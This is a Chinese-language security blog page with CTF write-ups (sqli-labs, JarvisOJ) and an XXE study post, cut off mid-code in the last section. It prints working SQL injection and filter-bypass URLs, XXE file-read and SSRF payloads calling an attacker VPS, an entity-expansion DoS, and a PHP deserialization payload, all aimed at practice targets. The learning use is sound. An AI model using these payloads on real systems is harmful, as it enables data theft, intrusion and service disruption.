<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p><img src="https://i.loli.net/2018/02/19/5a8a70a68c474.jpg" alt=""><br>这一波测试发现加上单引号以后页面显示正常，但是加上双引号以后有一个报错信息<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have <span class="keyword">an</span> error <span class="keyword">in</span> your SQL syntax; check <span class="keyword">the</span> manual that corresponds <span class="built_in">to</span> your MySQL server <span class="built_in">version</span> <span class="keyword">for</span> <span class="keyword">the</span> <span class="literal">right</span> syntax <span class="built_in">to</span> use near <span class="string">'"1"") LIMIT 0,1'</span> <span class="keyword">at</span> <span class="built_in">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>所以进行绕过为”)，测试列数正确，OK，继续重复Less-1过程…<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">users</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/17/sqlilab-wp/" data-id="cjk0t3vei000w9cv4vwefwer8" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-Web/">CTF_Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL-injection/">SQL_injection</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-XXE漏洞学习分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/16/XXE漏洞学习分析/" class="article-date">
  <time datetime="2018-02-16T08:52:36.000Z" itemprop="datePublished">2018-02-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞学习/">漏洞学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/16/XXE漏洞学习分析/">XXE漏洞学习分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>关于XXE漏洞，到目前为止我遇见过两次，一次在SWPUCTF线上赛，另一次在Jarvis OJ上，看过一些大牛们写的分析，但是自己没认真地研究过这个漏洞，反正春节我也想躲个清静，那就研究一下这个漏洞吧！</p>
<h1 id="XML基本用法"><a href="#XML基本用法" class="headerlink" title="XML基本用法"></a>XML基本用法</h1><h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="DTD介绍"><a href="#DTD介绍" class="headerlink" title="DTD介绍"></a>DTD介绍</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。<br>带有 DTD 的 XML 文档实例<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="XML实体分为普通实体和参数实体两类："><a href="#XML实体分为普通实体和参数实体两类：" class="headerlink" title="XML实体分为普通实体和参数实体两类："></a>XML实体分为普通实体和参数实体两类：</h2><h3 id="普通实体"><a href="#普通实体" class="headerlink" title="普通实体"></a>普通实体</h3><p>内部：<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> <span class="keyword">file</span> <span class="string">"file:///路径"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>外部：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file<span class="built_in"> SYSTEM </span><span class="string">"外部文件URL地址"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>引用:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="built_in">file</span>;(根据实际情况，不一定是<span class="built_in">file</span></span><br></pre></td></tr></table></figure></p>
<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>内部：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title">!ENTITY</span> <span class="symbol">%file</span> <span class="string">"file:///路径"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>外部：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY file<span class="built_in"> SYSTEM </span><span class="string">"外部文件URL地址"</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>引用：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">file</span></span>;(同上</span><br></pre></td></tr></table></figure></p>
<p>##一个完整的简短XML示例<br>这是一个普通实体的内部访问实例。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY will "Hello World!"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;will;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="XXE漏洞造成的危害"><a href="#XXE漏洞造成的危害" class="headerlink" title="XXE漏洞造成的危害"></a>XXE漏洞造成的危害</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>构造以下XML(这里是外部访问，所以要带上SYSTEM)，然后发送:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "file:///路径"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>JarvisOJ上的原题来源于这个漏洞，链接<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a> ，题目要求也就是获取目标机器/home/ctf/flag.txt中的flag值。<br>还有一个点需要注意，如果读取的是php文件，直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="URL请求-SSRF攻击"><a href="#URL请求-SSRF攻击" class="headerlink" title="URL请求 SSRF攻击"></a>URL请求 SSRF攻击</h2><p>设置监听端口，比如1231（环境为Ubuntu 14.04）<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvvp <span class="number">1231</span></span><br></pre></td></tr></table></figure></p>
<p>然后构造<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "http://yourvps"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这时浏览器会一直处于加载状态，但是Ubuntu上能看到相关的访问信息。</p>
<h2 id="Dos"><a href="#Dos" class="headerlink" title="Dos"></a>Dos</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="params">&lt;!ELEMENT data (#ANY)&gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a0 "dos" &gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a1 "<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;<span class="variable">&amp;a0</span>;"&gt;</span></span><br><span class="line"><span class="params">&lt;!ENTITY a2 "<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;<span class="variable">&amp;a1</span>;"&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;data&gt;</span><span class="variable">&amp;a2</span>;<span class="params">&lt;/data&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果解析得很慢，说明测试成功。</p>
<p>参考文章：<br><a href="https://www.anquanke.com/post/id/86075" target="_blank" rel="noopener">XXE注入攻击笔记</a><br><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">小试XML实体注入攻击</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/16/XXE漏洞学习分析/" data-id="cjk0t3vek000z9cv4wol3py5c" class="article-share-link">Compartir</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-JarvisOJ" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/15/JarvisOJ/" class="article-date">
  <time datetime="2018-02-15T15:11:51.000Z" itemprop="datePublished">2018-02-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF/">CTF</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/15/JarvisOJ/">JarvisOJ Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h3><p>前天做了MOCTF，有些遗憾，本来能做出来的题却没能做出来(嚎啕大哭)，这次的失误也是因为以前自己做过的题并没有好好总结复习导致的，所以决定重新把之前做过的CTF题翻出来重新做一遍，重新学习吧！<br>由于难度问题，JarvisOJ上的题我还没有完全全部做完，这里先贴出我已经做出来的题目。<br>JarvisOJ：<a href="https://www.jarvisoj.com" target="_blank" rel="noopener">https://www.jarvisoj.com</a></p>
<h3 id="PORT-51"><a href="#PORT-51" class="headerlink" title="PORT 51"></a>PORT 51</h3><p><img src="https://i.loli.net/2018/02/15/5a84609d14c70.png" alt=""><br>根据提示，这里要使用vps上的51端口去访问，所以使用curl命令去访问即可获取flag。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl --<span class="keyword">local</span>-port <span class="number">51</span> http:<span class="comment">//web.jarvisoj.com:32770/</span></span><br></pre></td></tr></table></figure></p>
<p>flag:PCTF{M45t3r_oF_CuRl}</p>
<h3 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h3><p><img src="https://i.loli.net/2018/02/15/5a8461074978b.png" alt=""><br>只能由localhost访问，XFF无疑，构造X-Forwarded-For:127.0.0.1即可获取flag。<br>flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p>
<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>打开页面后是一个密码提示框，随意输入数字（比如:123）以后抓包在Repeater中查看，可以看到一条Hint信息。<br><img src="https://i.loli.net/2018/02/15/5a84612d80abb.png" alt=""><br>这里是需要进行单引号绕过，而md5($pass,true)是将md5值转换为16进制数，如果包含or，就能重置构造语句。<br><img src="https://i.loli.net/2018/02/15/5a846127d448a.png" alt=""><br>参考链接：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_31481187/</span>article<span class="regexp">/details/</span><span class="number">59727015</span></span><br></pre></td></tr></table></figure></p>
<p>所以直接提交ffifdyop就能获取flag。<br>flag:PCTF{R4w_md5_is_d4ng3rous}</p>
<h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>作为一个漫威老铁，第一次打开界面的时候惊艳到了我，神盾大法好！<br>OK，进入正题，右键源码以后发现了这个：<br><img src="https://i.loli.net/2018/02/15/5a84691f569a0.png" alt=""><br>c2hpZWxkLmpwZw==经过base64解码以后为shield.jpg，如法炮制，猜测了一下flag.php，不过没有，测试index.php，右键以后发现源码。<br><img src="https://i.loli.net/2018/02/15/5a84692816912.png" alt=""><br>里面require到了shield.php这个文件，这里有反序列化，但是不知道构造规则，而且最后调用了readfile()这个函数，所以猜测还存在shield.php的源码，再次base64以后提交查看是否有源代码。<br><img src="https://i.loli.net/2018/02/15/5a84692b81901.png" alt=""><br>果然这里还是有源代码的，并且readfile()这个函数就出自这个文件，读了一下代码发现构造的文件不为空且不能含有..和/以及\，成功读取以后就能返回需要的文件。<br>所以利用的还是PHP反序列化漏洞，根据代码提示，flag在pctf.php这个文件中，所以这里要读取的就是这个文件。<br>构造脚本写出反序列化代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span></span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">public</span> $file=<span class="string">"pctf.php"</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	$will=<span class="keyword">new</span> shield();</span></span><br><span class="line"><span class="php">	print_r(serialize($will));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:6</span><span class="selector-pseudo">:"Shield"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>因为是在index.php里面包含的shield.php，所以是在这里调用class参数构造反序列化。<br>最后访问:<br><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32768</span>/index.php?class=O:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>得到flag。<br><img src="https://i.loli.net/2018/02/15/5a84692838dc0.png" alt=""></p>
<h3 id="IN-A-mess"><a href="#IN-A-mess" class="headerlink" title="IN A mess"></a>IN A mess</h3><p>OK，右键源码index.phps找到代码，开始审计。<br><img src="https://i.loli.net/2018/02/15/5a8474719be1a.png" alt=""><br>id==0弱类型设置为a(或者其他字母)，a这里file_get_contents($a,’r’);这个函数果断php://input，b的话长度大于5并且要绕过ereg和substr，所以直接%00截断。<br><img src="https://i.loli.net/2018/02/15/5a8474703bae9.png" alt=""><br>获取字段：^HT2mCpcvOLf<br><img src="https://i.loli.net/2018/02/15/5a84747039ef2.png" alt=""><br>测试以后发现sql注入，并且爆出表名content。<br><img src="https://i.loli.net/2018/02/15/5a84747017595.png" alt=""><br>开始绕sql注入，首先发现过滤了空格<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>回显出列数为3。<br>测试过程中发现其还过滤了from，但没有过滤where。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)<span class="regexp">/*123*/</span>frfromom<span class="regexp">/*123*/i</span>nformation_schema.tables<span class="regexp">/*123*/</span>where<span class="regexp">/*123*/</span>table_schema=<span class="number">0</span>x74657374%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>表名只有content，和之前报错出来的一样，下面注列。<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32780</span><span class="regexp">/^HT2mCpcvOLf/i</span>ndex.php?id=-<span class="number">1</span><span class="regexp">/*123*/u</span>nunionion<span class="regexp">/*123*/</span>selselectect<span class="regexp">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="regexp">/*123*/</span>frfromom<span class="regexp">/*123*/i</span>nformation_schema.columns<span class="regexp">/*123*/</span>where<span class="regexp">/*123*/</span>table_name=<span class="number">0</span>x636F6E74656E74%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>注出列有：id,context,title。<br>修改注入语句拿flag。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:<span class="number">32780</span>/^HT2mCpcvOLf/index.php?id=-<span class="number">1</span><span class="comment">/*123*/</span>ununionion<span class="comment">/*123*/</span>selselectect<span class="comment">/*123*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="built_in">concat</span>(id,<span class="built_in">context</span>,<span class="built_in">title</span>)<span class="comment">/*123*/</span>frfromom<span class="comment">/*123*/</span>content%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>flag:PCTF{Fin4lly_U_got_i7_C0ngRatulation5}</p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h3><p>点进去以后直接就是一个文件下载，下载出来的文件为<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">udf</span><span class="selector-class">.so</span><span class="selector-class">.02f8981200697e5eeb661e64797fc172</span> 。</span><br></pre></td></tr></table></figure></p>
<p>udf?<br>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。<br>这里参考到了一篇文章，关于Mysql的udf提权： <a href="https://www.404sec.com/7815.html" target="_blank" rel="noopener">https://www.404sec.com/7815.html</a><br>简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行，OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。<br>创建自定义函数的语法：create function 函数名 returns string soname ‘导出的DLL路径’；<br>现在，把这个文件通过命令<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">https:</span><span class="comment">//dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span><br></pre></td></tr></table></figure></p>
<p>直接导入位于Ubuntu（我的版本是14.04）下的mysql目录：/usr/lib/mysql/plugin中，然后启动mysql。<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mysql -u root -p</span></span><br></pre></td></tr></table></figure></p>
<p>如果没有配置相关环境，可以参考我的这篇博客：<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://willardtm.github.io/<span class="number">2018</span>/<span class="number">02</span>/<span class="number">10</span>/Ubuntu<span class="symbol">%E6</span><span class="symbol">%90</span><span class="symbol">%AD</span><span class="symbol">%E5</span><span class="symbol">%BB</span><span class="symbol">%BA</span><span class="symbol">%E6</span><span class="symbol">%BC</span><span class="symbol">%8</span>F<span class="symbol">%E6</span><span class="symbol">%B4</span><span class="symbol">%9</span>E<span class="symbol">%E7</span><span class="symbol">%8</span>E<span class="symbol">%AF</span><span class="symbol">%E5</span><span class="symbol">%A2</span><span class="symbol">%83</span>/</span><br></pre></td></tr></table></figure></p>
<p>创建自定义函数。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">create</span> <span class="function"><span class="keyword">function</span> <span class="title">help_me</span> <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> <span class="string">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>访问自定义函数。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">help_me</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/15/5a8484a62f306.png" alt=""><br>get到提示以后再次创建自定义函数。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">create</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span> <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> <span class="string">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span></span><br></pre></td></tr></table></figure></p>
<p>访问自定义函数。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">getflag</span>(<span class="params"></span>)</span>;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/02/15/5a8484a630f88.png" alt=""><br>成功获取flag:PCTF{Interesting_U5er_d3fined_Function}</p>
<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>抓包以后发现role和hsh这两个参数很可疑，role是经过了两次URL加密后的guest，但是hsh不能被md5解密，所以我修改为s:5:”admin”;按照其两次URL加密的方式提交，只有一行报错信息，但似乎没有什么用？<br>于是我猜想可能会有源码泄露，果然，源码泄露在index.php~下面，OK，获取源码，但是查看完源码以后发现源码是坏的，vim -r只能恢复swap文件，所以重命名index.php~为index.php.swp，再vim -r index.php.swp即可恢复。<br><img src="https://i.loli.net/2018/02/15/5a8549de601f0.jpg" alt=""><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">       $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">       $role = <span class="string">"guest"</span>;</span></span><br><span class="line"><span class="php">       $salt = </span></span><br><span class="line"><span class="php">       <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span></span><br><span class="line"><span class="php">           $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span></span><br><span class="line"><span class="php">           $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span></span><br><span class="line"><span class="php">           <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span></span><br><span class="line"><span class="php">               $auth = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">           &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">               $auth = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">           &#125;</span></span><br><span class="line"><span class="php">       &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">           $s = serialize($role);</span></span><br><span class="line"><span class="php">           setcookie(<span class="string">'role'</span>,$s);</span></span><br><span class="line"><span class="php">           $hsh = md5($salt.strrev($s));</span></span><br><span class="line"><span class="php">           setcookie(<span 